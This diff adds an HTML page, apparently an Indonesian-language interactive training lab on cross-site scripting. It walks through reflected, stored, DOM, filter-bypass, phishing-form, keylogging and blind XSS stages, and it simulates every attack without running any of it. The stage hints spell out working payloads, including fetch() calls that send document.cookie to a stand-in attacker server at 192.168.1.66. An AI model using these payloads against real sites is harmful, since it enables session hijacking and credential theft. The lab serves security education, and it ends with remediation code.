@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab A11: Advanced XSS</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.onkeydown = e => { if(e.keyCode == 123 || (e.ctrlKey && e.keyCode == 85)) return false; };
+        });
+    </script>
+
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #0f172a; height: 100vh; overflow: hidden; color: #e2e8f0; }
+        .lab-wrapper { display: flex; height: 100vh; }
+        
+        /* SIDEBAR */
+        .sidebar { width: 400px; background: #1e293b; border-right: 1px solid #334155; display: flex; flex-direction: column; z-index: 10; box-shadow: 5px 0 15px rgba(0,0,0,0.3); }
+        .sidebar-header { padding: 20px; background: #020617; border-bottom: 1px solid #334155; }
+        .sidebar-content { flex-grow: 1; padding: 20px; overflow-y: auto; }
+        .level-badge { font-size: 0.75rem; text-transform: uppercase; background: #be185d; border: 1px solid #f472b6; color: #fbcfe8; padding: 5px 10px; border-radius: 4px; margin-bottom: 10px; display: inline-block; }
+        .mission-card { background: #334155; border-radius: 8px; padding: 20px; margin-bottom: 20px; border-left: 4px solid #f472b6; animation: fadeIn 0.5s; }
+        .hint-box { background: #451a03; border: 1px solid #f59e0b; color: #fcd34d; padding: 15px; border-radius: 8px; margin-top: 10px; display: none; font-size: 0.9rem; border-left: 4px solid #f59e0b; }
+        .code-snippet { font-family: 'Share Tech Mono', monospace; font-size: 0.8rem; background: #000; padding: 15px; border-radius: 6px; border: 1px solid #334155; margin-top: 10px; display: none; color: #a5b4fc; }
+
+        /* MAIN AREA */
+        .main-area { flex-grow: 1; padding: 20px; background: #0f172a; display: flex; flex-direction: column; gap: 20px; }
+
+        /* BROWSER */
+        .browser { background: #fff; border-radius: 8px; overflow: hidden; display: flex; flex-direction: column; height: 60%; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #475569; position: relative; }
+        .browser-bar { background: #f1f5f9; padding: 8px 15px; border-bottom: 1px solid #cbd5e1; display: flex; align-items: center; }
+        .url-box { background: #fff; border: 1px solid #cbd5e1; border-radius: 20px; padding: 4px 15px; flex-grow: 1; margin-left: 15px; font-size: 0.85rem; color: #64748b; font-family: monospace; cursor: pointer; }
+        .app-view { flex-grow: 1; background: #f8fafc; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; }
+
+        /* SCENARIO UI */
+        .page-content { display: none; width: 100%; max-width: 600px; margin: 0 auto; }
+        .page-content.active { display: block; animation: fadeIn 0.3s; }
+        
+        .post-card { background: white; border-radius: 8px; padding: 15px; margin-bottom: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
+        .avatar { width: 40px; height: 40px; border-radius: 50%; background: #ddd; margin-right: 10px; display: flex; align-items: center; justify-content: center; font-weight: bold; }
+        
+        /* ATTACKER SERVER */
+        .hacker-server { background: #000; border: 1px solid #334155; border-radius: 8px; height: 35%; display: flex; flex-direction: column; font-family: 'Share Tech Mono', monospace; }
+        .server-header { background: #1e293b; padding: 5px 15px; font-size: 0.75rem; border-bottom: 1px solid #334155; color: #f43f5e; display: flex; justify-content: space-between; }
+        .server-logs { padding: 15px; color: #22c55e; font-size: 0.8rem; overflow-y: auto; flex-grow: 1; }
+
+        /* FAKE ALERT */
+        .xss-alert { position: absolute; top: 30%; left: 50%; transform: translateX(-50%); background: #fff; border: 1px solid #ccc; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 100; text-align: center; border-radius: 8px; display: none; min-width: 300px; }
+        
+        /* FAKE LOGIN (PHISHING) */
+        .fake-login { border: 1px solid #ccc; padding: 15px; background: #fff; margin-top: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+
+<div class="lab-wrapper">
+    <div class="sidebar">
+        <div class="sidebar-header">
+            <h5 class="mb-0 fw-bold" style="color: #f472b6 !important;"><i class="fas fa-code me-2"></i>Advanced XSS</h5>
+            <small class="text-secondary">Level: <span id="levelIndicator">1/8</span></small>
+        </div>
+        <div class="sidebar-content">
+            <div id="missionDisplay"></div>
+            
+            <div class="mt-4 pt-3 border-top border-secondary">
+                <button onclick="toggleHint()" class="btn btn-outline-warning btn-sm w-100 mb-2">
+                    <i class="far fa-lightbulb me-2"></i>Buka Petunjuk (Hint)
+                </button>
+                <div id="hintBox" class="hint-box"></div>
+            </div>
+
+            <div id="remediationSection" style="display: none;">
+                <hr class="border-secondary my-4">
+                <h6 class="text-success fw-bold">Analisis Kode</h6>
+                <div class="d-flex gap-2 mb-2">
+                    <button class="btn btn-xs btn-outline-danger w-50 active" onclick="showCode('vuln')">Vulnerable</button>
+                    <button class="btn btn-xs btn-outline-success w-50" onclick="showCode('secure')">Secure</button>
+                </div>
+                <div id="codeVuln" class="code-snippet">// ❌ Echo langsung<br>echo $_GET['input'];</div>
+                <div id="codeSecure" class="code-snippet">// ✅ Output Encoding<br>echo htmlspecialchars($input, ENT_QUOTES);<br><br>// ✅ CSP Header<br>Content-Security-Policy: default-src 'self';</div>
+                <button onclick="finishLab()" class="btn btn-success w-100 mt-3 fw-bold">Selesai</button>
+            </div>
+        </div>
+        <div class="p-3 bg-black text-center border-top border-secondary"><a href="../index.html" class="text-white-50 text-decoration-none small">Dashboard</a></div>
+    </div>
+
+    <div class="main-area">
+        
+        <div class="browser">
+            <div class="browser-bar">
+                <div class="d-flex gap-1 me-2"><span class="rounded-circle bg-danger" style="width:10px;height:10px"></span><span class="rounded-circle bg-warning" style="width:10px;height:10px"></span></div>
+                <div class="url-box" id="urlDisplay" onclick="editUrl()">social.warganet.local/feed</div>
+            </div>
+            
+            <div class="app-view">
+                <div id="xssPopup" class="xss-alert">
+                    <h4 class="text-danger mb-3"><i class="fas fa-bug"></i> XSS EXECUTED!</h4>
+                    <p id="xssMessage">1</p>
+                    <button class="btn btn-dark btn-sm px-4" onclick="closePopup()">OK</button>
+                </div>
+
+                <div id="pageSearch" class="page-content">
+                    <div class="card p-4 text-center mt-5">
+                        <i class="fas fa-search fa-3x text-primary mb-3"></i>
+                        <h4>Cari Pengguna</h4>
+                        <div class="input-group mt-3">
+                            <input type="text" id="searchInput" class="form-control" placeholder="Nama teman...">
+                            <button onclick="doSearch()" class="btn btn-primary">Search</button>
+                        </div>
+                        <div id="searchResult" class="mt-3 text-muted"></div>
+                    </div>
+                </div>
+
+                <div id="pageFeed" class="page-content active">
+                    <div class="post-card">
+                        <div class="post-header"><div class="avatar bg-primary text-white">A</div><div class="ms-2"><strong>Admin</strong><br><span class="small text-muted">Pinned Post</span></div></div>
+                        <div class="post-content">Selamat datang di WargaNet! Silakan berdiskusi dengan sopan.</div>
+                        <hr>
+                        <div id="commentsArea" class="mb-3"></div>
+                        <div class="input-group">
+                            <input type="text" id="commentInput" class="form-control form-control-sm" placeholder="Tulis komentar...">
+                            <button onclick="postComment()" class="btn btn-sm btn-outline-primary">Kirim</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="pageSupport" class="page-content">
+                    <div class="card p-4">
+                        <h5 class="fw-bold"><i class="fas fa-headset me-2"></i>Hubungi Admin</h5>
+                        <p class="small text-muted">Pesan Anda akan dibaca oleh Admin di dashboard internal.</p>
+                        <textarea id="supportMsg" class="form-control mb-3" rows="3" placeholder="Keluhan Anda..."></textarea>
+                        <button onclick="sendSupport()" class="btn btn-success w-100">Kirim Tiket</button>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <div class="hacker-server">
+            <div class="server-header">
+                <span><i class="fas fa-server me-2"></i>ATTACKER C2 SERVER (192.168.1.66)</span>
+                <span class="badge bg-danger">LISTENING</span>
+            </div>
+            <div class="server-logs" id="serverLogs">
+                > Server started on port 80...<br>
+                > Listening for incoming callbacks...
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<script>
+    let level = 1;
+    
+    // SAFE PAYLOAD CHECKER (Using Includes instead of executing)
+    // Ini memastikan kode aman di cPanel
+    
+    const missions = [
+        {},
+        { // 1
+            badge: "Tahap 1: Reflected XSS",
+            title: "Uji Pantulan (Search)",
+            desc: "Fitur pencarian menampilkan input user kembali ke layar. Coba suntikkan script sederhana.<br><br><strong>Tugas:</strong> Buka halaman 'Search' (Klik URL di atas jika perlu), lalu masukkan payload alert.",
+            hint: "Payload: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>",
+            action: "navigate('pageSearch')"
+        },
+        { // 2
+            badge: "Tahap 2: Stored XSS",
+            title: "Serangan Permanen (Comment)",
+            desc: "Pindah ke halaman Feed. Masukkan script di kolom komentar.<br>Jika berhasil, script akan tersimpan dan dieksekusi setiap kali halaman dibuka.",
+            hint: "Payload sama: <code>&lt;script&gt;alert('stored')&lt;/script&gt;</code>",
+            action: "navigate('pageFeed')"
+        },
+        { // 3
+            badge: "Tahap 3: DOM-Based XSS",
+            title: "Manipulasi URL Hash",
+            desc: "Aplikasi ini membaca URL Fragment (#) secara tidak aman.<br><br>Klik <strong>URL Bar</strong> di atas browser, lalu tambahkan payload di belakang URL.",
+            hint: "Tambahkan: <code>#&lt;img src=x onerror=alert('DOM')&gt;</code>",
+            action: ""
+        },
+        { // 4
+            badge: "Tahap 4: Obfuscation",
+            title: "Melewati Filter WAF",
+            desc: "Admin telah memblokir kata <code>script</code> dan <code>alert</code>.<br>Coba bypass menggunakan tag <code>&lt;img&gt;</code> atau <code>&lt;svg&gt;</code> dan fungsi <code>confirm()</code>.",
+            hint: "Payload: <code>&lt;img src=x onerror=confirm(1)&gt;</code>",
+            action: "navigate('pageFeed')"
+        },
+        { // 5
+            badge: "Tahap 5: Phishing Injection",
+            title: "Memalsukan Login (Defacement)",
+            desc: "Mari tingkatkan dampak serangan. Suntikkan formulir login palsu di kolom komentar untuk menipu pengguna lain.",
+            hint: "Payload: <code>&lt;form&gt;&lt;h5&gt;Login ulang:&lt;/h5&gt;&lt;input&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;</code>",
+            action: "navigate('pageFeed')"
+        },
+        { // 6
+            badge: "Tahap 6: Keylogging",
+            title: "Merekam Ketikan",
+            desc: "Suntikkan skrip yang merekam tombol keyboard. <br>Gunakan atribut <code>onkeypress</code> pada body (simulasi).",
+            hint: "Ketik di komentar: <code>keylogger</code> (Simulasi Payload Kompleks).",
+            action: ""
+        },
+        { // 7
+            badge: "Tahap 7: Cookie Stealing",
+            title: "Mencuri Sesi",
+            desc: "Kirim cookie pengguna ke server penyerang (Box hitam di bawah).",
+            hint: "Payload: <code>&lt;script&gt;fetch('http://192.168.1.66?cookie='+document.cookie)&lt;/script&gt;</code>",
+            action: ""
+        },
+        { // 8
+            badge: "Tahap 8: Blind XSS",
+            title: "Menyerang Admin Panel",
+            desc: "Pindah ke halaman <strong>Hubungi Admin</strong>. Kirim payload berbahaya di pesan tiket. <br>Payload tidak akan muncul di sini, tapi akan dieksekusi saat Admin membuka dashboardnya.",
+            hint: "Payload: <code>&lt;script&gt;fetch('http://192.168.1.66?admin_cookie='+document.cookie)&lt;/script&gt;</code>",
+            action: "navigate('pageSupport')"
+        }
+    ];
+
+    function renderMission() {
+        if(level > 8) return;
+        const m = missions[level];
+        document.getElementById('levelIndicator').innerText = level + "/8";
+        document.getElementById('missionDisplay').innerHTML = `<span class="level-badge">${m.badge}</span><div class="mission-card"><h5 class="fw-bold mb-3 text-white">${m.title}</h5><p class="small text-light opacity-75">${m.desc}</p></div>`;
+        document.getElementById('hintBox').style.display = 'none';
+        document.getElementById('hintBox').innerHTML = `<i class="fas fa-info-circle me-2"></i>${m.hint}`;
+        
+        // Auto navigate based on mission config
+        if(m.action && m.action.includes('navigate')) {
+            const page = m.action.match(/'([^']+)'/)[1];
+            navigate(page);
+        }
+    }
+
+    function toggleHint() { const box = document.getElementById('hintBox'); box.style.display = box.style.display === 'block' ? 'none' : 'block'; }
+
+    // --- NAVIGATION LOGIC ---
+    function navigate(pageId) {
+        document.querySelectorAll('.page-content').forEach(p => p.classList.remove('active'));
+        document.getElementById(pageId).classList.add('active');
+        
+        // Update URL Bar
+        const urlMap = {
+            'pageSearch': 'warganet.local/search',
+            'pageFeed': 'warganet.local/feed',
+            'pageSupport': 'warganet.local/support'
+        };
+        document.getElementById('urlDisplay').innerText = urlMap[pageId];
+    }
+
+    function editUrl() {
+        if(level !== 3) return;
+        const current = document.getElementById('urlDisplay').innerText;
+        const input = prompt("Edit URL Browser:", current);
+        if(input) {
+            document.getElementById('urlDisplay').innerText = input;
+            // Level 3 Check
+            if(input.includes("#") && input.includes("<img") && input.includes("onerror")) {
+                triggerAlert("DOM XSS Executed!");
+                level = 4; renderMission();
+            }
+        }
+    }
+
+    // --- ALERT SYSTEM ---
+    function triggerAlert(msg) {
+        document.getElementById('xssPopup').style.display = 'block';
+        document.getElementById('xssMessage').innerText = msg;
+    }
+    function closePopup() {
+        document.getElementById('xssPopup').style.display = 'none';
+    }
+
+    // --- LEVEL HANDLERS ---
+
+    // L1: Search
+    function doSearch() {
+        const val = document.getElementById('searchInput').value;
+        const res = document.getElementById('searchResult');
+        res.innerText = "Hasil: " + val; // Safe text render
+        
+        if(level === 1 && val.includes("<script>alert")) {
+            triggerAlert("Reflected XSS!");
+            level = 2; renderMission();
+        }
+    }
+
+    // L2, L4, L5, L6, L7: Comments
+    function postComment() {
+        const val = document.getElementById('commentInput').value;
+        const box = document.getElementById('commentsArea');
+        const logs = document.getElementById('serverLogs');
+
+        // Render visual bubble
+        const div = document.createElement('div');
+        div.className = "bg-light p-2 mb-2 rounded border";
+        
+        // L5 Phishing Visual
+        if(val.includes("<form") && level === 5) {
+            div.innerHTML = `<div class="fake-login"><h5>Session Expired</h5><input class="form-control mb-1" placeholder="Username"><input class="form-control mb-1" type="password" placeholder="Password"><button class="btn btn-primary btn-sm w-100">Login</button></div>`;
+            box.appendChild(div);
+            alert("Phishing Form Injected!");
+            level = 6; renderMission();
+            return;
+        } 
+        
+        div.innerText = "User: " + val;
+        box.appendChild(div);
+
+        // Logic Checks
+        if(level === 2 && val.includes("<script>alert")) {
+            triggerAlert("Stored XSS!");
+            level = 3; renderMission();
+        }
+        else if(level === 4 && val.includes("<img") && val.includes("confirm")) {
+            if(confirm("WAF Bypass Success?")) {
+                level = 5; renderMission();
+            }
+        }
+        else if(level === 6 && val.toLowerCase() === "keylogger") {
+            logs.innerHTML += `<br><span class="text-info">> Keylogger Active. Receiving keystrokes...</span>`;
+            logs.innerHTML += `<br><span class="text-white">k, e, y, s, ...</span>`;
+            logs.scrollTop = logs.scrollHeight;
+            level = 7; renderMission();
+        }
+        else if(level === 7 && val.includes("fetch") && val.includes("192.168.1.66")) {
+            logs.innerHTML += `<br><span class="text-warning">> GET /?cookie=SESSION_ID_XYZ123</span>`;
+            logs.innerHTML += `<br><span class="text-success fw-bold">[+] SESSION STOLEN</span>`;
+            logs.scrollTop = logs.scrollHeight;
+            level = 8; renderMission();
+        }
+    }
+
+    // L8: Blind XSS
+    function sendSupport() {
+        const val = document.getElementById('supportMsg').value;
+        const logs = document.getElementById('serverLogs');
+        
+        if(level === 8 && val.includes("fetch") && val.includes("admin_cookie")) {
+            alert("Tiket terkirim. Menunggu Admin membuka tiket...");
+            
+            setTimeout(() => {
+                logs.innerHTML += `<br><span class="text-info">> Waiting for admin...</span>`;
+                logs.scrollTop = logs.scrollHeight;
+            }, 1000);
+
+            setTimeout(() => {
+                logs.innerHTML += `<br><span class="text-danger fw-bold">[!] BLIND XSS TRIGGERED!</span>`;
+                logs.innerHTML += `<br><span class="text-warning">> Admin Cookie Received: ADMIN_SESS_999</span>`;
+                logs.scrollTop = logs.scrollHeight;
+                
+                // Finish
+                level = 9; renderMission();
+                document.getElementById('remediationSection').style.display = 'block';
+                document.querySelector('.sidebar-content').scrollTop = document.querySelector('.sidebar-content').scrollHeight;
+            }, 3000);
+        } else {
+            alert("Pesan terkirim (Aman). Coba masukkan payload XSS.");
+        }
+    }
+
+    function showCode(t) {
+        document.getElementById('codeVuln').style.display = 'none';
+        document.getElementById('codeSecure').style.display = 'none';
+        document.getElementById(t==='vuln'?'codeVuln':'codeSecure').style.display = 'block';
+    }
+    
+    function finishLab() { localStorage.setItem('sim_a11', 'done'); window.location.href = '../index.html'; }
+
+    renderMission();
+</script>
+</body>
+</html>
